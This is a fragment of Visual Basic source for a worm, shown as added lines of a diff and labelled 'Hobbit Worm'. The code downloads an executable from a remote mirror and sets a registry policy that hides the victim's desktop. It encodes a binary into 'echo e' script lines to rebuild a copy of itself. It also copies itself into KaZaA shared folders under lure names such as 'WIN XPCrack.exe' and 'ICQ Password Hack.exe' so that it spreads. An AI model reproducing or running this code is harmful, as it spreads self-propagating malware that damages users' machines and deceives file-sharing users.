+   databyte() = Inet1.OpenURL("http://www.mirror.ac.uk/sites/ftp.info-zip.org/pub/infozip/WIN32/zip23xN.zip/zip.exe?extract=true", icByteArray)
+   Open aPath & "zippy.exe" For Binary Access Write As #2
+   Put #2, , databyte()
+   Close #2
+   End Sub
+
+   Sub Done()
+   On Error Resume Next
+   Dim registry
+   Set registry = CreateObject("WScript.Shell")
+   registry.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop=dword:00000001"
+   MsgBox "(c) by Energy and alco", vbCritical, "Hobbit Worm"
+   End Sub
+
+   Function g1(ggg As String)
+   On Error Resume Next
+   Dim bbyte As Byte
+   Dim i, b, xeh, xeh1, xeh2, a, q, rrr, xxx, n, gg, ttt, ddd, fff, gs, cunter, tercunt, e, s, xsx, sxs
+   Open ggg For Binary As #1
+   Do While Not EOF(1)
+   DoEvents
+   Get #1, , bbyte
+   e = Hex(bbyte)
+   If Len(e) = 1 Then e = "0" & Hex(bbyte)
+   a = a & e & " "
+   Loop
+   Close #1
+   a = a
+   xeh = Array("0", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F")
+   xeh1 = Array("1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "0")
+   xeh2 = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F")
+   For q = 1 To Len(a) Step 48
+   DoEvents
+   rrr = rrr + 1
+   xxx = xxx + 1
+   n = n + 1
+   gg = gg + 1 / 16
+   If gg = 16 Then
+   gg = 0
+   End If
+   If n = 17 Then
+   n = 1
+   End If
+   ttt = ttt + 1 / 256
+   If ttt = 256 Then
+   ttt = 0
+   End If
+   ddd = RTrim(Mid(a, q, 48))
+   fff = "echo e " & xeh2(Int(ttt)) & xeh1(Int(gg)) & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   If rrr = 16 Then
+   fff = "echo e " & xeh2(Int(ttt)) & "1" & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   gg = 15 / 16
+   End If
+   If xxx = 240 Then
+   fff = "echo e 0" & xeh1(Int(gg)) & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   ttt = 255 / 256
+   End If
+   gs = gs & fff
+   Next
+   gs = Mid(gs, 1, (Len(gs) - 2))
+   g1 = gs
+   End Function
+
+   Sub KaZaA()
+   On Error Resume Next
+   Dim KaZaADir(1 To 2) As String
+   KaZaADir(1) = "C:\KaZaA\My Shared Folder\"
+   KaZaADir(2) = "C:\Program Files\KaZaA\My Shared Folder\"
+   Dim KaZaAPath As String
+   Dim FSO1
+   Set FSO1 = CreateObject("Scripting.FileSystemObject")
+   If FSO1.FolderExists(KaZaADir(1)) = True Then KaZaAPath = "C:\KaZaA\My Shared Folder\"
+   If FSO1.FolderExists(KaZaADir(2)) = True Then KaZaAPath = "C:\Program Files\KaZaA\My Shared Folder\"
+   If KaZaAPath <> "" Then GoTo KaZaATrue
+   GoTo KaZaAFalse
+   KaZaATrue:
+   FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "WIN XPCrack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "All GamesHack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "ICQ Password Hack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "HotMailHack.exe "
+   FileCopy App.Path & "\" & App.EXEName & ".exe", KaZaAPath & "Unreal Tournament 3 FullDownloader.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".scr", KaZaAPath & "WIN XPCrack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".scr", KaZaAPath & "All GamesHack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".scr", KaZaAPath & "ICQ Password Hack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".scr", KaZaAPath & "HotMailHack.exe "
+   FileCopy App.Path & "\" & App.EXEName & ".scr", KaZaAPath & "Unreal Tournament 3 FullDownloader.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".pif", KaZaAPath & "WIN XPCrack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".pif", KaZaAPath & "All GamesHack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".pif", KaZaAPath & "ICQ Password Hack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".pif", KaZaAPath & "HotMailHack.exe "
+   FileCopy App.Path & "\" & App.EXEName & ".pif", KaZaAPath & "Unreal Tournament 3 FullDownloader.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".bat", KaZaAPath & "WIN XPCrack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".bat", KaZaAPath & "All GamesHack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".bat", KaZaAPath & "ICQ Password Hack.exe"
+   FileCopy App.Path & "\" & App.EXEName & ".bat", KaZaAPath & "HotMailHack.exe "
+   FileCopy App.Path & "\" & App.EXEName & ".bat", KaZaAPath & "Unreal Tournament 3 FullDownloader.exe"
+   KaZaAFalse: 'Quit
+   End Sub
